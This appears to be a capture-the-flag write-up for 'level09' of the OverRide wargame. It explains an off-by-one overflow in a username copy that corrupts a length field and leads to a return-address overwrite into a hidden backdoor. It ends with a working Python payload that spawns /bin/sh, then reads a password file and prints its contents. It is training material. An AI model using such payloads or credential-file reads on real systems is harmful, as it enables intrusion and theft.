# Level09

Running this binary gives us a `username` and `message` prompts, both using `fgets()`.		
After disassembling we notice a `secret_backdoor()` function that will run any system command we provide but it is not part of he execution flow. 		
From this we can assume we will have to overwrite an `EIP` save and redirect to it.		

The strings received by the program for the username and message prompts are handled by `set_username()` and `set_msg()` functions respectively and are then stored inside the following structure:		
```c
typedef struct s_message
{
    char text[140];		// message destination
    char username[40];		// username destination
    int len;			// 140
} t_message;
```

Both functions use local buffers to store each result of `fgets()` before copying it into the main structure. 		
They use two different methods to make this copy:		
- `set_msg()` uses `strncpy()` and the `s_message->len` as size parameter. 
- `set_username()` copies the characters one by one from the local buffer to `s_message->username` using a loop and index.		

The copy loop in `set_username()` is repeated 41 times, this means we have a 1 byte overflow that allows us to overwrite the first (biggest) byte of `s_message->len`, and in turn change the size parameter for the `strncpy()` call in `set_msg()` to any value from 0 to 256.		

If the `EIP` save is less than 248 bytes after our `s_message->text` buffer (this binary is 64 bit so we need 8 bytes to write the address) we can exploit this 1 byte overflow to take control of the execution flow.		

The buffer starts in `rbp - 0xc0 (192)` and there is a single `push rbp` (8), this means the `EIP` save is at `buffer + (192 + 8)`. 		

All that is left is to get the address for `secret_backdoor()` and write our command:		
```bash
python -c "print 40 * 'a' + '\xd4' + '\n' + 'a' * 200 + '\x00\x00\x55\x55\x55\x55\x48\x8c'[::-1] + '/bin/sh'" > /tmp/inj09
level09@OverRide:~$ cat /tmp/inj09 - | ./level09
--------------------------------------------
|   ~Welcome to l33t-m$n ~    v1337        |
--------------------------------------------
>: Enter your username
>>: >: Welcome, aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa�>: Msg @Unix-Dude
>>: >: Msg sent!
cat /home/users/end/.pass
j4AunAPDXaJxxWjYEUxpanmvSgRDV3tpA5BEaBuE
```
